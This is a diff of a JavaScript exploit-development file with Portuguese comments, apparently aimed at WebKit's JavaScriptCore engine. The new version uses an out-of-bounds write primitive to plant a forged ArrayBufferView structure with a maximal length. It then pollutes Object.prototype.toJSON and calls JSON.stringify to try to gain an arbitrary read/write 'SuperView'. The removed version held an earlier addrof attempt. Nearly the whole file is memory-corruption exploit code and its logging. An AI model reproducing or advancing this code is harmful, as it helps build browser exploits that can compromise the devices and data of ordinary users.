@@ -14,174 +14,207 @@ import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v20_Combined_Fix1"; // Versão com correção
+const FNAME_MAIN = "ExploitLogic_v21_FocusActivation";
 
 // --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
 const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58;
-const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; 
-const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       
+const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; // Placeholder
+const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       // Placeholder (Uint32ArrayType)
 const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
 const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
 const FAKE_VIEW_CELLINFO_STATE        = 0x01;
+// !! IMPORTANTE !! FAKE_VIEW_ASSOCIATED_BUFFER_PTR precisa ser o ponteiro real para o JSArrayBuffer do oob_array_buffer_real
+// para que a view seja válida. AdvancedInt64.Zero é um placeholder incorreto para um JSValue.
 const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; 
-const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero; 
-const FAKE_VIEW_MLENGTH_VALUE         = 0xFFFFFFFF;     
-const FAKE_VIEW_MMODE_VALUE           = 0x00000000;     
+const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero; // m_vector = 0 (aponta para o início do buffer da view)
+const FAKE_VIEW_MLENGTH_VALUE         = 0xFFFFFFFF;     // m_length = MAX
+const FAKE_VIEW_MMODE_VALUE           = 0x00000000;     // AllowShared
 
-// --- Constantes para a parte "AddrOf" ---
-const GETTER_PROPERTY_NAME_ADDROF = "GetterForCombinedTest_v20Fix1";
-const PLANT_OFFSET_0x6C_ADDROF    = 0x6C; 
-const PLANT_DWORD_FOR_0x6C_ADDROF = 0x190A190A; 
-const CORRUPTION_OFFSET_TRIGGER_MAIN = 0x70; 
-const CORRUPTION_VALUE_TRIGGER_MAIN  = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); 
+// Valores de teste para plantar e ler com a SuperView
+const OOB_BUFFER_MARKER_OFFSET = 0x0; // Início do oob_array_buffer_real
+const OOB_BUFFER_MARKER_VALUE  = 0x41424344;
+const FAKE_VIEW_SID_READ_OFFSET = FAKE_VIEW_BASE_OFFSET_IN_OOB; // Para ler o SID da própria estrutura fake
+const OTHER_SID_READ_OFFSET    = 0x400; // Outro local de teste
+const OTHER_SID_READ_VALUE     = 0xFEEDFACE;
 
-// --- Constantes para Teste de Leitura da SuperView ---
-const TEST_READ_SPOOFED_SID_OFFSET = 0x400; 
-const TEST_READ_SPOOFED_SID_VALUE  = 0xFEEDFACE; 
 
-let combined_test_results = {};
-let target_function_for_addrof_v20; 
-
+let getter_activation_details = null;
 
 // ============================================================
-// FUNÇÃO PRINCIPAL (v20_Combined_Fix1)
+// FUNÇÃO toJSON Poluída para Testar Ativação da SuperView
 // ============================================================
-export async function sprayAndInvestigateObjectExposure() {
-    logS3(`--- Iniciando ${FNAME_MAIN}: Teste Combinado AddrOf e Ativação de SuperView Fake (Fix Limpeza 32B) ---`, "test", FNAME_MAIN);
-    
-    combined_test_results = {
-        getter_called: false,
-        candidate_addrof_hex: null,
-        superview_read_test_value_hex: null,
+functiontoJSON_FocusActivationAttempt() {
+    const FNAME_toJSON = "toJSON_FocusActivation";
+    logS3(`[${FNAME_toJSON}] Getter ACIONADO!`, "vuln", FNAME_toJSON);
+    getter_activation_details = {
+        this_type: "N/A",
+        this_length: "N/A",
+        read_oob_marker: "N/A",
+        read_fake_view_sid: "N/A",
+        read_other_sid: "N/A",
         error: null
     };
 
-    target_function_for_addrof_v20 = function() { return "target_func_v20_fix1"; };
-    let sprayedFuncs = [];
-    for(let i=0; i < 10; i++) sprayedFuncs.push(target_function_for_addrof_v20);
+    try {
+        getter_activation_details.this_type = Object.prototype.toString.call(this);
+        logS3(`  [${FNAME_toJSON}] this type: ${getter_activation_details.this_type}`, "info", FNAME_toJSON);
+
+        // Acessar o length é geralmente o primeiro passo que pode falhar ou revelar a corrupção
+        getter_activation_details.this_length = this.length;
+        logS3(`  [${FNAME_toJSON}] this.length: ${toHex(getter_activation_details.this_length)} (Decimal: ${getter_activation_details.this_length})`, "leak", FNAME_toJSON);
+
+        if (getter_activation_details.this_length === FAKE_VIEW_MLENGTH_VALUE) {
+            logS3(`    !!!! POTENCIAL SUPER VIEW ATIVA !!!! this.length (${toHex(this.length)}) corresponde a FAKE_VIEW_MLENGTH_VALUE!`, "vuln", FNAME_toJSON);
+            document.title = "SUPERVIEW ACTIVE?!";
+
+            try {
+                const val_marker = this[OOB_BUFFER_MARKER_OFFSET / 4]; // Divide por 4 para índice Uint32
+                getter_activation_details.read_oob_marker = toHex(val_marker);
+                logS3(`    [SuperView?] this[${OOB_BUFFER_MARKER_OFFSET / 4}] (lendo OOB_BUFFER_MARKER_VALUE de ${toHex(OOB_BUFFER_MARKER_OFFSET)}): ${toHex(val_marker)} (Esperado: ${toHex(OOB_BUFFER_MARKER_VALUE)})`, "leak", FNAME_toJSON);
+                if (val_marker !== OOB_BUFFER_MARKER_VALUE) {
+                    logS3("      AVISO: Valor do marcador OOB não corresponde!", "warn", FNAME_toJSON);
+                }
+            } catch (e_read_marker) {
+                logS3(`    [SuperView?] ERRO ao ler this[${OOB_BUFFER_MARKER_OFFSET / 4}]: ${e_read_marker.message}`, "error", FNAME_toJSON);
+                getter_activation_details.read_oob_marker = "ERROR_READ";
+            }
+
+            try {
+                const val_fvsid = this[FAKE_VIEW_SID_READ_OFFSET / 4];
+                getter_activation_details.read_fake_view_sid = toHex(val_fvsid);
+                logS3(`    [SuperView?] this[${FAKE_VIEW_SID_READ_OFFSET / 4}] (lendo FAKE_VIEW_STRUCTURE_ID de ${toHex(FAKE_VIEW_SID_READ_OFFSET)}): ${toHex(val_fvsid)} (Esperado: ${toHex(FAKE_VIEW_STRUCTURE_ID)})`, "leak", FNAME_toJSON);
+                if (val_fvsid !== FAKE_VIEW_STRUCTURE_ID) {
+                    logS3("      AVISO: Valor do SID da view fake não corresponde!", "warn", FNAME_toJSON);
+                }
+            } catch (e_read_fvsid) {
+                logS3(`    [SuperView?] ERRO ao ler this[${FAKE_VIEW_SID_READ_OFFSET / 4}]: ${e_read_fvsid.message}`, "error", FNAME_toJSON);
+                getter_activation_details.read_fake_view_sid = "ERROR_READ";
+            }
+            
+            try {
+                const val_osid = this[OTHER_SID_READ_OFFSET / 4];
+                getter_activation_details.read_other_sid = toHex(val_osid);
+                logS3(`    [SuperView?] this[${OTHER_SID_READ_OFFSET / 4}] (lendo OTHER_SID_READ_VALUE de ${toHex(OTHER_SID_READ_OFFSET)}): ${toHex(val_osid)} (Esperado: ${toHex(OTHER_SID_READ_VALUE)})`, "leak", FNAME_toJSON);
+                 if (val_osid !== OTHER_SID_READ_VALUE) {
+                    logS3("      AVISO: Valor do outro SID não corresponde!", "warn", FNAME_toJSON);
+                }
+            } catch (e_read_osid) {
+                logS3(`    [SuperView?] ERRO ao ler this[${OTHER_SID_READ_OFFSET / 4}]: ${e_read_osid.message}`, "error", FNAME_toJSON);
+                getter_activation_details.read_other_sid = "ERROR_READ";
+            }
+
+        } else if (typeof getter_activation_details.this_length === 'number') {
+            logS3(`    INFO: this.length (${toHex(this.length)}) não é o esperado para a SuperView.`, "info", FNAME_toJSON);
+        }
+
+    } catch (e_main_getter) {
+        logS3(`  [${FNAME_toJSON}] ERRO GERAL NO GETTER ao acessar 'this' ou 'this.length': ${e_main_getter.name} - ${e_main_getter.message}`, "critical", FNAME_toJSON);
+        getter_activation_details.error = `${e_main_getter.name}: ${e_main_getter.message}`;
+        document.title = `GETTER CRASH: ${e_main_getter.name}`;
+    }
+    return { toJSON_getter_executed: true, collected_details: getter_activation_details };
+}
+
+// ============================================================
+// FUNÇÃO PRINCIPAL (v21_FocusActivation)
+// ============================================================
+export async function sprayAndInvestigateObjectExposure() {
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.focusFakeViewActivation`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Foco na Ativação da View Fake em 0x58 via toJSON ---`, "test", FNAME_CURRENT_TEST);
+    document.title = "FocusActivation v21 Test...";
+
+    getter_activation_details = null; // Resetar
+    let trigger_obj = { p1: "trigger_data", p2: { n1: 123 }}; // Objeto para JSON.stringify
 
     try {
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real) {
-            throw new Error("OOB Init failed");
-        }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_MAIN);
-
-        // PASSO 0: Limpar áreas relevantes do oob_array_buffer_real
-        logS3("PASSO 0: Limpando áreas de trabalho...", "info", FNAME_MAIN);
-        // CORREÇÃO APLICADA AQUI: Limpar 32 bytes em blocos de 8 bytes
-        const area_to_clean_start = FAKE_VIEW_BASE_OFFSET_IN_OOB; //0x58
-        const area_to_clean_size = 32;
-        logS3(`  Limpando ${area_to_clean_size} bytes a partir de ${toHex(area_to_clean_start)}...`, "info", FNAME_MAIN);
-        for (let i = 0; i < area_to_clean_size / 8; i++) {
-            oob_write_absolute(area_to_clean_start + (i * 8), AdvancedInt64.Zero, 8);
-        }
-        
-        oob_write_absolute(PLANT_OFFSET_0x6C_ADDROF, AdvancedInt64.Zero, 8);     
-        oob_write_absolute(TEST_READ_SPOOFED_SID_OFFSET, 0x0, 4); 
+        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
+        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
 
         // PASSO 1: Plantar a estrutura FALSA de ArrayBufferView em FAKE_VIEW_BASE_OFFSET_IN_OOB (0x58)
-        logS3(`PASSO 1: Plantando estrutura fake de ArrayBufferView em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}...`, "info", FNAME_MAIN);
+        logS3(`PASSO 1: Plantando estrutura fake de ArrayBufferView em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
         const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
-        const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET; // Offset base para TypeInfo
+        const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
         const bufferPtrOff   = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET;
         const mVectorOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
         const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
         const mModeOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;
 
         oob_write_absolute(sidOffset, FAKE_VIEW_STRUCTURE_ID, 4);
-        oob_write_absolute(typeInfoBaseOffset + 0, FAKE_VIEW_TYPEINFO_TYPE, 1); // CELL_TYPEINFO_TYPE_FLATTENED_OFFSET
-        oob_write_absolute(typeInfoBaseOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1); // CELL_TYPEINFO_FLAGS_FLATTENED_OFFSET is type_offset + 1
-        oob_write_absolute(typeInfoBaseOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1); // CELL_FLAGS_OR_INDEXING_TYPE_FLATTENED_OFFSET is type_offset + 2
-        oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1); // CELL_STATE_FLATTENED_OFFSET is type_offset + 3
-        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8);
+        oob_write_absolute(typeInfoBaseOffset + 0, FAKE_VIEW_TYPEINFO_TYPE, 1);
+        oob_write_absolute(typeInfoBaseOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1);
+        oob_write_absolute(typeInfoBaseOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1);
+        oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1);
+        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8); // Placeholder!
         oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
         oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_VALUE, 4);
         oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
-        logS3(`  Estrutura fake plantada em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}. SID Fake: ${toHex(FAKE_VIEW_STRUCTURE_ID)}`, "good", FNAME_MAIN);
+        logS3(`  Estrutura fake plantada. SID: ${toHex(FAKE_VIEW_STRUCTURE_ID)}, m_vec: ${FAKE_VIEW_MVECTOR_VALUE.toString(true)}, m_len: ${toHex(FAKE_VIEW_MLENGTH_VALUE)}.`, "good", FNAME_CURRENT_TEST);
 
-        // PASSO 1.5: Plantar SID de teste para leitura pela SuperView
-        oob_write_absolute(TEST_READ_SPOOFED_SID_OFFSET, TEST_READ_SPOOFED_SID_VALUE, 4);
-        logS3(`PASSO 1.5: Plantado SID de teste ${toHex(TEST_READ_SPOOFED_SID_VALUE)} em ${toHex(TEST_READ_SPOOFED_SID_OFFSET)}`, "info", FNAME_MAIN);
-
-        // PASSO 2: Plantar o marcador para o "AddrOf" em 0x6C
-        const value_to_plant_at_0x6C = new AdvancedInt64(PLANT_DWORD_FOR_0x6C_ADDROF, 0x00000000);
-        oob_write_absolute(PLANT_OFFSET_0x6C_ADDROF, value_to_plant_at_0x6C, 8);
-        logS3(`PASSO 2: Plantado marcador ${value_to_plant_at_0x6C.toString(true)} em oob_buffer[${toHex(PLANT_OFFSET_0x6C_ADDROF)}]`, "info", FNAME_MAIN);
-
-        // PASSO 3: Configurar e acionar o Getter para tentar ler o "AddrOf"
-        const getterObjectForCombinedTest = {
-            get [GETTER_PROPERTY_NAME_ADDROF]() {
-                combined_test_results.getter_called = true;
-                logS3(`    >>>> [GETTER ${GETTER_PROPERTY_NAME_ADDROF} ACIONADO!] <<<<`, "vuln", FNAME_MAIN);
-                try {
-                    const value_read_from_0x68 = oob_read_absolute(0x68, 8);
-                    logS3(`    [GETTER] Valor lido de oob_buffer[0x68]: ${value_read_from_0x68.toString(true)}`, "info", FNAME_MAIN);
-
-                    if (value_read_from_0x68.high() === PLANT_DWORD_FOR_0x6C_ADDROF) {
-                        combined_test_results.candidate_addrof_hex = value_read_from_0x68.toString(true);
-                        logS3(`      POTENCIAL ADDR_OF CANDIDATO (de 0x68, marcador ${toHex(PLANT_DWORD_FOR_0x6C_ADDROF)} na parte alta OK): ${combined_test_results.candidate_addrof_hex}`, "vuln", FNAME_MAIN);
-                    } else {
-                        logS3(`      Marcador ${toHex(PLANT_DWORD_FOR_0x6C_ADDROF)} não encontrado na parte alta do valor de 0x68. Encontrado: ${value_read_from_0x68.toString(true)}`, "warn", FNAME_MAIN);
-                    }
-                } catch (e_getter) {
-                    combined_test_results.error = `Getter error: ${e_getter.message}`;
-                    logS3(`    [GETTER] ERRO: ${e_getter.message}`, "error", FNAME_MAIN);
-                }
-                return "GetterCombinedTestValue";
-            }
-        };
-
-        // PASSO 4: Escrita OOB CRÍTICA (Trigger)
-        logS3(`PASSO 4: Escrevendo trigger ${CORRUPTION_VALUE_TRIGGER_MAIN.toString(true)} em ${toHex(CORRUPTION_OFFSET_TRIGGER_MAIN)}...`, "warn", FNAME_MAIN);
-        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_MAIN, CORRUPTION_VALUE_TRIGGER_MAIN, 8);
+        // PASSO 1.5: Plantar valores de teste no oob_array_buffer_real
+        oob_write_absolute(OOB_BUFFER_MARKER_OFFSET, OOB_BUFFER_MARKER_VALUE, 4);
+        logS3(`  Plantado OOB_BUFFER_MARKER_VALUE (${toHex(OOB_BUFFER_MARKER_VALUE)}) em ${toHex(OOB_BUFFER_MARKER_OFFSET)}`, "info", FNAME_CURRENT_TEST);
+        oob_write_absolute(OTHER_SID_READ_OFFSET, OTHER_SID_READ_VALUE, 4);
+        logS3(`  Plantado OTHER_SID_READ_VALUE (${toHex(OTHER_SID_READ_VALUE)}) em ${toHex(OTHER_SID_READ_OFFSET)}`, "info", FNAME_CURRENT_TEST);
         
-        await PAUSE_S3(100); 
-        
-        logS3(`PASSO 4.5: Chamando JSON.stringify para acionar getter (tentativa de addrof)...`, "info", FNAME_MAIN);
-        JSON.stringify(getterObjectForCombinedTest); 
-        
-        await PAUSE_S3(100); 
+        await PAUSE_S3(100);
 
-        // PASSO 5: Testar se o oob_dataview_real se tornou uma "Super View"
-        logS3(`PASSO 5: Testando capacidade de leitura estendida (SuperView?)...`, "test", FNAME_MAIN);
+        // PASSO 2: Tentar ativar/usar a estrutura fake via poluição de toJSON
+        logS3(`PASSO 2: Tentando ativação especulativa via JSON.stringify e toJSON poluído...`, "test", FNAME_CURRENT_TEST);
+        const ppKey = 'toJSON';
+        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+        let pollutionApplied = false;
+
         try {
-            logS3(`  Tentando ler SID de teste ${toHex(TEST_READ_SPOOFED_SID_VALUE)} de ${toHex(TEST_READ_SPOOFED_SID_OFFSET)} usando oob_dataview_real...`, "info", FNAME_MAIN);
-            const value_read_by_dataview = oob_dataview_real.getUint32(TEST_READ_SPOOFED_SID_OFFSET, true);
-            combined_test_results.superview_read_test_value_hex = toHex(value_read_by_dataview);
-            logS3(`    Valor lido: ${combined_test_results.superview_read_test_value_hex}`, "leak", FNAME_MAIN);
+            Object.defineProperty(Object.prototype, ppKey, {
+                value: toJSON_FocusActivationAttempt, // Corrigido para o nome da função
+                writable: true, configurable: true, enumerable: false
+            });
+            pollutionApplied = true;
+            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_FocusActivationAttempt.name}.`, "info", FNAME_CURRENT_TEST);
 
-            if (value_read_by_dataview === TEST_READ_SPOOFED_SID_VALUE) {
-                logS3("    !!!! SUCESSO NA LEITURA DE TESTE !!!! O SID plantado foi lido corretamente.", "good", FNAME_MAIN);
+            logS3(`  Chamando JSON.stringify(trigger_obj)... Trigger: ${JSON.stringify(trigger_obj)}`, "info", FNAME_CURRENT_TEST);
+            await PAUSE_S3(50); // Pausa antes da chamada crítica
+            let stringifyResult = JSON.stringify(trigger_obj); // PONTO CRÍTICO
+            
+            logS3(`  JSON.stringify completou. Resultado (parcial): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_CURRENT_TEST);
+            if (getter_activation_details) {
+                logS3(`  Detalhes coletados pelo getter toJSON: ${JSON.stringify(getter_activation_details)}`, "leak", FNAME_CURRENT_TEST);
+                if (getter_activation_details.this_length === FAKE_VIEW_MLENGTH_VALUE && getter_activation_details.read_oob_marker === toHex(OOB_BUFFER_MARKER_VALUE) ) {
+                    logS3("    !!!! SUCESSO ESPECULATIVO !!!! 'this' no toJSON parece ser a SUPER VIEW FUNCIONAL!", "vuln", FNAME_CURRENT_TEST);
+                    document.title = "SUPERVIEW ACTIVATED & READ OK!";
+                } else if (getter_activation_details.error) {
+                     logS3(`    PROBLEMA: Erro no getter: ${getter_activation_details.error}`, "error", FNAME_CURRENT_TEST);
+                } else {
+                    logS3("    INFO: Getter toJSON executado, mas 'this' não se comportou como a SuperView esperada ou leituras falharam.", "info", FNAME_CURRENT_TEST);
+                }
             } else {
-                logS3("    FALHA NA LEITURA DE TESTE: Valor lido não corresponde ao SID plantado.", "warn", FNAME_MAIN);
+                 logS3("    AVISO: getter_activation_details é nulo. O getter toJSON pode não ter sido chamado ou falhou catastroficamente antes de logar.", "critical", FNAME_CURRENT_TEST);
             }
-        } catch (e_superview_read) {
-            combined_test_results.error = (combined_test_results.error || "") + ` SuperViewReadError: ${e_superview_read.message}`;
-            logS3(`    ERRO ao tentar leitura de teste com oob_dataview_real: ${e_superview_read.message}`, "error", FNAME_MAIN);
-        }
 
-        logS3("Resultados do Teste Combinado:", "info", FNAME_MAIN);
-        for (const key in combined_test_results) {
-            logS3(`  ${key}: ${combined_test_results[key]}`, "info", FNAME_MAIN);
-        }
-
-        if (combined_test_results.candidate_addrof_hex && combined_test_results.candidate_addrof_hex !== "0x00000000_00000000") {
-             logS3("SUCESSO POTENCIAL NO ADDR_OF: Um candidato a endereço foi obtido!", "vuln", FNAME_MAIN);
-             document.title = `ADDROF? ${combined_test_results.candidate_addrof_hex}`;
+        } catch (e_stringify) {
+            logS3(`  ERRO CRÍTICO durante JSON.stringify(trigger_obj): ${e_stringify.name} - ${e_stringify.message}`, "critical", FNAME_CURRENT_TEST);
+            document.title = `JSON_STRINGIFY CRASH: ${e_stringify.name}`;
+        } finally {
+            if (pollutionApplied) {
+                if (originalToJSONDescriptor) {
+                    Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
+                } else {
+                    delete Object.prototype[ppKey];
+                }
+                logS3(`  Object.prototype.${ppKey} restaurado.`, "info", FNAME_CURRENT_TEST);
+            }
         }
 
     } catch (e) {
-        combined_test_results.error = (combined_test_results.error || "") + ` General error: ${e.message}`;
-        logS3(`ERRO CRÍTICO GERAL: ${e.message}`, "critical", FNAME_MAIN);
-        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_MAIN);
-        document.title = `${FNAME_MAIN} FALHOU!`;
+        logS3(`ERRO CRÍTICO GERAL: ${e.message}`, "critical", FNAME_CURRENT_TEST);
+        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
+        document.title = `${FNAME_MAIN} FALHOU CRITICAMENTE!`;
     } finally {
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_MAIN} Concluído ---`, "test", FNAME_MAIN);
-        if (document.title.includes(FNAME_MAIN)) { 
-             document.title = `${FNAME_MAIN} Done`;
+        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
+        if (!document.title.includes("ACTIVATED") && !document.title.includes("HIT") && !document.title.includes("FALHOU") && !document.title.includes("CRASH") && !document.title.includes("ERR")) {
+            document.title = `${FNAME_MAIN} Done`;
         }
     }
-    return combined_test_results;
 }
